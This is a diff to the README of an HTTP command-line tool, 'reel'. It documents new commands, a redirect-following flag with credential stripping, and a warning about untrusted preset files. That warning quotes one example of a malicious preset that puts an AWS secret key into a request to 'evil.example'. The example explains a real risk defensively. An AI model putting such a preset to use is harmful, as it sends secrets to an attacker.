@@ -75,6 +75,9 @@ Commands can be combined freely in a single invocation.
 | `header-rm-all` | Remove all headers |
 | `body <BODY>` | Set request body |
 | `body @<PATH>` / `body -` | Set request body from a file / from stdin (`@@` escapes a body that starts with a literal `@`) |
+| `body-rm` | Remove the request body |
+| `cookie-rm <NAME>` | Remove all session cookies with the given name |
+| `timeout <SECONDS>` | Set the request timeout (default: 30; `0` disables the timeout) |
 | `var <NAME> <VALUE>` | Set a session variable, readable in templates as `${{ var.NAME }}` |
 | `var-rm <NAME>` | Remove a session variable |
 | `send` | Send the request using current session state |
@@ -90,9 +93,14 @@ Commands can be combined freely in a single invocation.
 | `save <PATH>` | Save current session state to a JSON file |
 | `fail` | Exit with code 1 if any `send` or `then` receives a 4xx/5xx response (position-independent) |
 | `--insecure` | Skip TLS certificate verification |
+| `--follow` | Follow 3xx redirects, like `curl -L` (up to 10 hops; cookies are collected on every hop) |
 | `--retry <N>` | Retry `send`/`then` up to N extra times on network error or 5xx |
 | `--until <CONDITION>` | Poll: repeat `send`/`then` until the condition passes |
 | `--delay <SECONDS>` | Sleep between retry/poll attempts (default: 1) |
+
+Flags may be written with or without the leading `--` (`fail`/`--fail`, `follow`/`--follow`, `retry 3`/`--retry 3`, …). A token consumed as a command's *value* (e.g. `header X-Mode insecure`) is never treated as a flag.
+
+Header names are case-insensitive: setting a header replaces any existing header of the same name, so a request carries at most one header per name. (Repeated same-name request headers — rare, but allowed by HTTP — are not supported.)
 
 ## Usage examples
 
@@ -248,6 +256,8 @@ Request values are captured **after** interpolation, so `${{ request.* }}` refle
 ```json
 { "url": "https://${{ env.API_HOST | default: localhost:8080 }}/users" }
 ```
+
+> **Treat preset files like scripts.** A preset defines a request that `then` executes on your behalf — including `${{ env.* }}` and `${{ var.* }}` placeholders that can read any environment variable or session variable and embed it in the URL, headers, or body. A malicious preset such as `{"url": "https://evil.example/?t=${{ env.AWS_SECRET_ACCESS_KEY }}"}` would exfiltrate a secret to an attacker's server. Only run preset files you trust, and inspect unfamiliar ones first — `reel --dry-run then preset.json` shows exactly what would be sent, without sending it.
 
 #### Two-step example
 
@@ -418,7 +428,7 @@ Details:
 - Response status is written to **stderr**, with timing and body size (`< 200 OK (142 ms, 4.1 kB)`)
 - Response body is written to **stdout**
 - When stdout is a terminal, a JSON body is pretty-printed for readability; when piped or redirected, the raw bytes are written untouched — `reel send | jq .` sees exactly what the server sent. (Exception: a body that is not valid UTF-8 — binary data — has invalid bytes replaced, with a warning on stderr; a declared non-UTF-8 charset is transcoded to UTF-8.)
-- Redirects are **not** followed (same as `curl` without `-L`): a 3xx response is shown like any other, so you can inspect the `Location` header and the cookie jar sees every hop
+- Redirects are **not** followed by default (same as `curl` without `-L`): a 3xx response is shown like any other, so you can inspect the `Location` header. With `--follow`, up to 10 redirects are chased automatically: cookies are still collected on every hop, a `303` (and a `301`/`302` after `POST`) switches the method to `GET` and drops the body, and on a redirect to a **different host** the user-set `Authorization` and `Cookie` headers are stripped — credentials never ride to a host you didn't send them to. Only the final request/response pair enters the session history.
 - `show`, confirmations (`Request loaded from: …`, `Session cleared.`), and all diagnostic messages go to **stderr**
 - `response headers` writes headers to **stdout** (it is data, not a status message)
 
